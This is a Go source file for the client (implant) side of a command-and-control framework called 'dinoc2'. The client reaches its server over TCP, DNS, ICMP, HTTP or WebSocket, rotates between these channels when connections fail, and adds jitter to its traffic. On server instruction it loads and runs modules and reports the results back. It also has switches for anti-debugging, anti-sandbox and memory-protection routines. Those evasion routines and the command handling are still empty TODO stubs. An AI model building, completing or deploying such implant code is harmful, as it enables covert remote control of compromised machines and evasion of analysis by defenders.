package client

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"sync"
	"time"

	"dinoc2/pkg/crypto"
	"dinoc2/pkg/module"
	"dinoc2/pkg/module/loader"
	"dinoc2/pkg/module/manager"
	"dinoc2/pkg/protocol"
)

// ProtocolType represents the type of protocol used for communication
type ProtocolType string

const (
	ProtocolTCP       ProtocolType = "tcp"
	ProtocolDNS       ProtocolType = "dns"
	ProtocolICMP      ProtocolType = "icmp"
	ProtocolHTTP      ProtocolType = "http"
	ProtocolWebSocket ProtocolType = "websocket"
)

// ConnectionState represents the current state of a client connection
type ConnectionState int

const (
	StateDisconnected ConnectionState = iota
	StateConnecting
	StateConnected
	StateReconnecting
	StateSwitchingProtocol
)

// ClientConfig contains configuration options for the client
type ClientConfig struct {
	ServerAddress     string
	Protocols         []ProtocolType
	EncryptionAlg     string
	HeartbeatInterval time.Duration
	ReconnectInterval time.Duration
	MaxRetries        int
	JitterEnabled     bool
	JitterRange       [2]time.Duration
	EnableAntiDebug   bool
	EnableAntiSandbox bool
	EnableMemProtect  bool
}

// DefaultConfig returns a default client configuration
func DefaultConfig() *ClientConfig {
	return &ClientConfig{
		ServerAddress:     "",
		Protocols:         []ProtocolType{ProtocolTCP},
		EncryptionAlg:     "aes",
		HeartbeatInterval: 30 * time.Second,
		ReconnectInterval: 5 * time.Second,
		MaxRetries:        5,
		JitterEnabled:     true,
		JitterRange:       [2]time.Duration{100 * time.Millisecond, 1 * time.Second},
		EnableAntiDebug:   true,
		EnableAntiSandbox: true,
		EnableMemProtect:  true,
	}
}

// Client represents a C2 client
type Client struct {
	config          *ClientConfig
	protocolHandler *protocol.ProtocolHandler
	SessionID       crypto.SessionID
	currentProtocol ProtocolType
	protocolIndex   int
	state           ConnectionState
	stateMutex      sync.RWMutex
	connMutex       sync.Mutex
	conn            Connection
	ctx             context.Context
	cancel          context.CancelFunc
	retryCount      int
	lastHeartbeat   time.Time
	isActive        bool
	moduleManager   *manager.ModuleManager
	loadedModules   map[string]module.Module
	moduleMutex     sync.RWMutex
}

// NewClient creates a new C2 client with the specified configuration
func NewClient(config *ClientConfig) (*Client, error) {
	if config == nil {
		config = DefaultConfig()
	}

	if config.ServerAddress == "" {
		return nil, errors.New("server address is required")
	}

	if len(config.Protocols) == 0 {
		return nil, errors.New("at least one protocol must be specified")
	}

	ctx, cancel := context.WithCancel(context.Background())

	// Create module manager
	moduleManager, err := manager.NewModuleManager()
	if err != nil {
		log.Printf("Warning: Failed to initialize module manager: %v", err)
		moduleManager = nil
	}

	client := &Client{
		config:          config,
		protocolHandler: protocol.NewProtocolHandler(),
		SessionID:       crypto.GenerateSessionID(),
		currentProtocol: config.Protocols[0],
		protocolIndex:   0,
		state:           StateDisconnected,
		ctx:             ctx,
		cancel:          cancel,
		retryCount:      0,
		lastHeartbeat:   time.Now(),
		isActive:        false,
		moduleManager:   moduleManager,
		loadedModules:   make(map[string]module.Module),
	}

	// Configure protocol handler
	client.protocolHandler.SetJitterEnabled(config.JitterEnabled)
	client.protocolHandler.SetJitterRange(config.JitterRange[0], config.JitterRange[1])

	// Initialize security features if enabled
	if config.EnableAntiDebug {
		go client.runAntiDebugChecks()
	}

	if config.EnableAntiSandbox {
		go client.runAntiSandboxChecks()
	}

	if config.EnableMemProtect {
		client.initializeMemoryProtection()
	}

	return client, nil
}

// Start initiates the client connection and processing loops
func (c *Client) Start() error {
	c.stateMutex.Lock()
	if c.isActive {
		c.stateMutex.Unlock()
		return errors.New("client is already running")
	}
	c.isActive = true
	c.stateMutex.Unlock()

	// Create encryption session
	err := c.protocolHandler.CreateSession(c.SessionID, crypto.AlgorithmAES)
	if err != nil {
		return fmt.Errorf("failed to create encryption session: %w", err)
	}

	// Start connection
	if err := c.connect(); err != nil {
		return err
	}

	// Start heartbeat and message processing goroutines
	go c.heartbeatLoop()
	go c.processMessages()

	return nil
}

// Stop gracefully shuts down the client
func (c *Client) Stop() error {
	c.stateMutex.Lock()
	defer c.stateMutex.Unlock()

	if !c.isActive {
		return nil
	}

	// Cancel context to stop all goroutines
	c.cancel()
	c.isActive = false

	// Close current connection if any
	if c.conn != nil {
		c.conn.Close()
		c.conn = nil
	}

	// Shutdown all modules
	if c.moduleManager != nil {
		errors := c.moduleManager.ShutdownAllModules()
		if len(errors) > 0 {
			for _, err := range errors {
				fmt.Printf("Error shutting down module: %v\n", err)
			}
		}
	}

	// Update state
	c.state = StateDisconnected

	return nil
}

// GetState returns the current connection state
func (c *Client) GetState() ConnectionState {
	c.stateMutex.RLock()
	defer c.stateMutex.RUnlock()
	return c.state
}

// GetSessionID returns the client's session ID
func (c *Client) GetSessionID() string {
	return string(c.SessionID)
}

// GetCurrentProtocol returns the client's current protocol
func (c *Client) GetCurrentProtocol() string {
	c.stateMutex.RLock()
	defer c.stateMutex.RUnlock()
	return string(c.currentProtocol)
}

// GetLastHeartbeat returns the time of the last heartbeat
func (c *Client) GetLastHeartbeat() time.Time {
	c.stateMutex.RLock()
	defer c.stateMutex.RUnlock()
	return c.lastHeartbeat
}

// GetEncryptionAlgorithm returns the client's encryption algorithm
func (c *Client) GetEncryptionAlgorithm() string {
	return c.config.EncryptionAlg
}

// SwitchProtocol switches the client to a different protocol
func (c *Client) SwitchProtocol(protocol string) error {
	return c.HandleProtocolSwitchCommand(protocol)
}

// connect establishes a connection using the current protocol
func (c *Client) connect() error {
	c.connMutex.Lock()
	defer c.connMutex.Unlock()

	// Update state
	c.setState(StateConnecting)

	// Create connection for the current protocol
	conn, err := c.createConnection(c.currentProtocol)
	if err != nil {
		c.setState(StateDisconnected)
		return fmt.Errorf("failed to create connection: %w", err)
	}

	// Connect to the server
	if err := conn.Connect(); err != nil {
		c.setState(StateDisconnected)
		return fmt.Errorf("failed to connect: %w", err)
	}

	// Update client state
	c.conn = conn
	c.setState(StateConnected)
	c.retryCount = 0
	c.lastHeartbeat = time.Now()

	return nil
}

// reconnect attempts to reconnect using the current or next protocol
func (c *Client) reconnect() error {
	c.connMutex.Lock()
	defer c.connMutex.Unlock()

	// Update state
	c.setState(StateReconnecting)

	// Close current connection if any
	if c.conn != nil {
		c.conn.Close()
		c.conn = nil
	}

	// Increment retry count
	c.retryCount++

	// If max retries reached, switch to next protocol
	if c.retryCount >= c.config.MaxRetries {
		c.switchToNextProtocol()
		c.retryCount = 0
	}

	// Create connection for the current protocol
	conn, err := c.createConnection(c.currentProtocol)
	if err != nil {
		c.setState(StateDisconnected)
		return fmt.Errorf("failed to create connection: %w", err)
	}

	// Connect to the server
	if err := conn.Connect(); err != nil {
		// Connection failed, but we'll keep trying
		return fmt.Errorf("failed to reconnect: %w", err)
	}

	// Update client state
	c.conn = conn
	c.setState(StateConnected)
	c.lastHeartbeat = time.Now()

	return nil
}

// switchToNextProtocol switches to the next available protocol
func (c *Client) switchToNextProtocol() {
	c.stateMutex.Lock()
	defer c.stateMutex.Unlock()

	c.state = StateSwitchingProtocol

	// Move to the next protocol in the list
	c.protocolIndex = (c.protocolIndex + 1) % len(c.config.Protocols)
	c.currentProtocol = c.config.Protocols[c.protocolIndex]

	fmt.Printf("Switching to protocol: %s\n", c.currentProtocol)
}

// switchToProtocol switches to a specific protocol
func (c *Client) switchToProtocol(protocol ProtocolType) error {
	c.stateMutex.Lock()
	defer c.stateMutex.Unlock()

	// Check if the protocol is supported
	protocolFound := false
	for i, p := range c.config.Protocols {
		if p == protocol {
			c.protocolIndex = i
			protocolFound = true
			break
		}
	}

	if !protocolFound {
		return fmt.Errorf("unsupported protocol: %s", protocol)
	}

	c.state = StateSwitchingProtocol
	c.currentProtocol = protocol

	fmt.Printf("Switching to protocol: %s\n", c.currentProtocol)

	// Close current connection
	if c.conn != nil {
		c.conn.Close()
		c.conn = nil
	}

	return nil
}

// createConnection creates a connection for the specified protocol
func (c *Client) createConnection(protocol ProtocolType) (Connection, error) {
	switch protocol {
	case ProtocolTCP:
		return NewTCPConnection(c.config.ServerAddress, c.protocolHandler, c.SessionID)
	case ProtocolDNS:
		return NewDNSConnection(c.config.ServerAddress, c.protocolHandler, c.SessionID)
	case ProtocolICMP:
		return NewICMPConnection(c.config.ServerAddress, c.protocolHandler, c.SessionID)
	case ProtocolHTTP:
		return NewHTTPConnection(c.config.ServerAddress, c.protocolHandler, c.SessionID)
	case ProtocolWebSocket:
		return NewWebSocketConnection(c.config.ServerAddress, c.protocolHandler, c.SessionID)
	default:
		return nil, fmt.Errorf("unsupported protocol: %s", protocol)
	}
}

// heartbeatLoop sends periodic heartbeats to the server
func (c *Client) heartbeatLoop() {
	ticker := time.NewTicker(c.config.HeartbeatInterval)
	defer ticker.Stop()

	for {
		select {
		case <-c.ctx.Done():
			return
		case <-ticker.C:
			c.sendHeartbeat()
		}
	}
}

// sendHeartbeat sends a heartbeat packet to the server
func (c *Client) sendHeartbeat() {
	c.stateMutex.RLock()
	if c.state != StateConnected {
		c.stateMutex.RUnlock()
		return
	}
	c.stateMutex.RUnlock()

	// Create heartbeat packet
	packet := protocol.NewPacket(protocol.PacketTypeHeartbeat, nil)

	// Send the packet
	c.connMutex.Lock()
	defer c.connMutex.Unlock()

	if c.conn == nil {
		return
	}

	err := c.conn.SendPacket(packet)
	if err != nil {
		fmt.Printf("Failed to send heartbeat: %v\n", err)
		// Connection might be broken, try to reconnect
		go c.handleConnectionFailure()
		return
	}

	c.lastHeartbeat = time.Now()
	fmt.Println("Heartbeat sent")
}

// processMessages processes incoming messages from the server
func (c *Client) processMessages() {
	for {
		select {
		case <-c.ctx.Done():
			return
		default:
			// Check if we're connected
			c.stateMutex.RLock()
			if c.state != StateConnected || c.conn == nil {
				c.stateMutex.RUnlock()
				time.Sleep(100 * time.Millisecond)
				continue
			}
			c.stateMutex.RUnlock()

			// Receive packet
			c.connMutex.Lock()
			packet, err := c.conn.ReceivePacket()
			c.connMutex.Unlock()

			if err != nil {
				fmt.Printf("Failed to receive packet: %v\n", err)
				// Connection might be broken, try to reconnect
				go c.handleConnectionFailure()
				time.Sleep(100 * time.Millisecond)
				continue
			}

			if packet == nil {
				time.Sleep(100 * time.Millisecond)
				continue
			}

			// Process the packet
			c.handlePacket(packet)
		}
	}
}

// handlePacket processes a received packet
func (c *Client) handlePacket(packet *protocol.Packet) {
	switch packet.Header.Type {
	case protocol.PacketTypeHeartbeat:
		// Server heartbeat response, update last heartbeat time
		c.lastHeartbeat = time.Now()

	case protocol.PacketTypeCommand:
		// Process command from server
		c.processCommand(packet)

	case protocol.PacketTypeProtocolSwitch:
		// Server requested protocol switch
		c.processProtocolSwitch(packet)

	case protocol.PacketTypeKeyExchange:
		// Key exchange request
		c.processKeyExchange(packet)

	case protocol.PacketTypeModuleData:
		// Module data from server
		c.processModuleData(packet)
		
	case protocol.PacketTypeModuleResponse:
		// Module response from server
		fmt.Printf("Received module response from server\n")
		// This would typically be handled by a module response handler

	case protocol.PacketTypeError:
		// Error from server
		fmt.Printf("Received error from server: %s\n", string(packet.Data))

	default:
		fmt.Printf("Received unknown packet type: %d\n", packet.Header.Type)
	}
}

// processCommand processes a command packet from the server
func (c *Client) processCommand(packet *protocol.Packet) {
	// TODO: Implement command processing
	fmt.Printf("Received command: %s\n", string(packet.Data))

	// Send response
	response := protocol.NewPacket(protocol.PacketTypeResponse, []byte("Command received"))
	response.SetTaskID(packet.Header.TaskID)

	c.connMutex.Lock()
	defer c.connMutex.Unlock()

	if c.conn == nil {
		return
	}

	err := c.conn.SendPacket(response)
	if err != nil {
		fmt.Printf("Failed to send response: %v\n", err)
	}
}

// HandleProtocolSwitchCommand handles a protocol switch command
func (c *Client) HandleProtocolSwitchCommand(protocol string) error {
	c.connMutex.Lock()
	defer c.connMutex.Unlock()
	
	// Check if the requested protocol is supported
	protocolType := ProtocolType(protocol)
	protocolFound := false
	for _, p := range c.config.Protocols {
		if p == protocolType {
			protocolFound = true
			break
		}
	}
	
	if !protocolFound {
		return fmt.Errorf("unsupported protocol: %s", protocol)
	}
	
	// Create connection for the new protocol
	newConn, err := c.createConnection(protocolType)
	if err != nil {
		return fmt.Errorf("failed to create %s connection: %w", protocol, err)
	}
	
	// Store the old connection for cleanup
	oldConn := c.conn
	
	// Switch to the new connection
	c.currentProtocol = protocolType
	c.conn = newConn
	
	// Update state
	c.setState(StateSwitchingProtocol)
	
	// Close the old connection
	if oldConn != nil {
		oldConn.Close()
	}
	
	// Connect with the new protocol
	if err := c.conn.Connect(); err != nil {
		c.setState(StateDisconnected)
		return fmt.Errorf("failed to connect with new protocol: %w", err)
	}
	
	c.setState(StateConnected)
	c.lastHeartbeat = time.Now()
	
	return nil
}

// processProtocolSwitch processes a protocol switch request from the server
func (c *Client) processProtocolSwitch(packet *protocol.Packet) {
	if len(packet.Data) == 0 {
		fmt.Println("Received empty protocol switch request")
		return
	}

	// Extract protocol from packet data
	protocolStr := string(packet.Data)
	
	fmt.Printf("Received protocol switch request: %s\n", protocolStr)

	// Handle the protocol switch command
	err := c.HandleProtocolSwitchCommand(protocolStr)
	if err != nil {
		fmt.Printf("Failed to switch protocol: %v\n", err)
	}
}

// processKeyExchange processes a key exchange packet from the server
func (c *Client) processKeyExchange(packet *protocol.Packet) {
	// TODO: Implement key exchange processing
	fmt.Println("Received key exchange request")
}

// processModuleData processes a module data packet from the server
func (c *Client) processModuleData(packet *protocol.Packet) {
	if c.moduleManager == nil {
		fmt.Println("Module manager not initialized, cannot process module data")
		return
	}

	// Parse module data
	if len(packet.Data) < 4 {
		fmt.Println("Invalid module data packet: too short")
		return
	}

	// Extract module name and command
	var moduleData struct {
		ModuleName string          `json:"module"`
		Command    string          `json:"command"`
		Args       []interface{}   `json:"args"`
		Data       []byte          `json:"data"`
	}

	err := json.Unmarshal(packet.Data, &moduleData)
	if err != nil {
		fmt.Printf("Failed to parse module data: %v\n", err)
		return
	}

	// Get or load the module
	mod, err := c.getOrLoadModule(moduleData.ModuleName)
	if err != nil {
		fmt.Printf("Failed to get/load module %s: %v\n", moduleData.ModuleName, err)
		c.sendModuleErrorResponse(packet.Header.TaskID, moduleData.ModuleName, err)
		return
	}

	// Execute the command
	result, err := mod.Exec(moduleData.Command, moduleData.Args...)
	if err != nil {
		fmt.Printf("Failed to execute command %s on module %s: %v\n", 
			moduleData.Command, moduleData.ModuleName, err)
		c.sendModuleErrorResponse(packet.Header.TaskID, moduleData.ModuleName, err)
		return
	}

	// Send response
	c.sendModuleResponse(packet.Header.TaskID, moduleData.ModuleName, result)
}

// getOrLoadModule gets an existing module or loads it if not already loaded
func (c *Client) getOrLoadModule(name string) (module.Module, error) {
	c.moduleMutex.RLock()
	mod, exists := c.loadedModules[name]
	c.moduleMutex.RUnlock()

	if exists {
		return mod, nil
	}

	// Module not loaded, try to load it
	if c.moduleManager == nil {
		return nil, fmt.Errorf("module manager not initialized")
	}

	// Load the module using the native loader
	mod, err := c.moduleManager.LoadModule(name, name, loader.LoaderTypeNative)
	if err != nil {
		return nil, fmt.Errorf("failed to load module: %w", err)
	}

	// Initialize the module
	err = c.moduleManager.InitModule(name, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to initialize module: %w", err)
	}

	// Store the module
	c.moduleMutex.Lock()
	c.loadedModules[name] = mod
	c.moduleMutex.Unlock()

	return mod, nil
}

// sendModuleResponse sends a module response to the server
func (c *Client) sendModuleResponse(taskID uint32, moduleName string, result interface{}) {
	// Create response data
	responseData := struct {
		Module string      `json:"module"`
		Result interface{} `json:"result"`
		Status string      `json:"status"`
	}{
		Module: moduleName,
		Result: result,
		Status: "success",
	}

	// Marshal response data
	data, err := json.Marshal(responseData)
	if err != nil {
		fmt.Printf("Failed to marshal module response: %v\n", err)
		return
	}

	// Create response packet
	response := protocol.NewPacket(protocol.PacketTypeModuleResponse, data)
	response.SetTaskID(taskID)

	// Send response
	c.connMutex.Lock()
	defer c.connMutex.Unlock()

	if c.conn == nil {
		return
	}

	err = c.conn.SendPacket(response)
	if err != nil {
		fmt.Printf("Failed to send module response: %v\n", err)
	}
}

// sendModuleErrorResponse sends a module error response to the server
func (c *Client) sendModuleErrorResponse(taskID uint32, moduleName string, err error) {
	// Create error response data
	errorData := struct {
		Module string `json:"module"`
		Error  string `json:"error"`
		Status string `json:"status"`
	}{
		Module: moduleName,
		Error:  err.Error(),
		Status: "error",
	}

	// Marshal error data
	data, err := json.Marshal(errorData)
	if err != nil {
		fmt.Printf("Failed to marshal module error response: %v\n", err)
		return
	}

	// Create response packet
	response := protocol.NewPacket(protocol.PacketTypeModuleResponse, data)
	response.SetTaskID(taskID)

	// Send response
	c.connMutex.Lock()
	defer c.connMutex.Unlock()

	if c.conn == nil {
		return
	}

	err = c.conn.SendPacket(response)
	if err != nil {
		fmt.Printf("Failed to send module error response: %v\n", err)
	}
}

// handleConnectionFailure handles a connection failure
func (c *Client) handleConnectionFailure() {
	c.stateMutex.RLock()
	if c.state == StateReconnecting || c.state == StateSwitchingProtocol {
		c.stateMutex.RUnlock()
		return
	}
	c.stateMutex.RUnlock()

	// Wait before reconnecting
	time.Sleep(c.config.ReconnectInterval)

	// Try to reconnect
	err := c.reconnect()
	if err != nil {
		fmt.Printf("Reconnection failed: %v\n", err)
		// Schedule another reconnection attempt
		go func() {
			time.Sleep(c.config.ReconnectInterval)
			c.handleConnectionFailure()
		}()
	}
}

// setState updates the client state
func (c *Client) setState(state ConnectionState) {
	c.stateMutex.Lock()
	defer c.stateMutex.Unlock()
	c.state = state
}

// Note: generateSessionID function has been replaced with crypto.GenerateSessionID()

// runAntiDebugChecks runs periodic anti-debugging checks
func (c *Client) runAntiDebugChecks() {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-c.ctx.Done():
			return
		case <-ticker.C:
			if detectDebugger() {
				fmt.Println("Debugger detected!")
				// TODO: Implement evasion or protection measures
			}
		}
	}
}

// runAntiSandboxChecks runs periodic anti-sandbox checks
func (c *Client) runAntiSandboxChecks() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-c.ctx.Done():
			return
		case <-ticker.C:
			if detectSandbox() {
				fmt.Println("Sandbox environment detected!")
				// TODO: Implement evasion or protection measures
			}
		}
	}
}

// initializeMemoryProtection sets up memory protection mechanisms
func (c *Client) initializeMemoryProtection() {
	// TODO: Implement memory protection
}

// detectDebugger checks for the presence of a debugger
func detectDebugger() bool {
	// TODO: Implement debugger detection
	return false
}

// detectSandbox checks for the presence of a sandbox environment
func detectSandbox() bool {
	// TODO: Implement sandbox detection
	return false
}
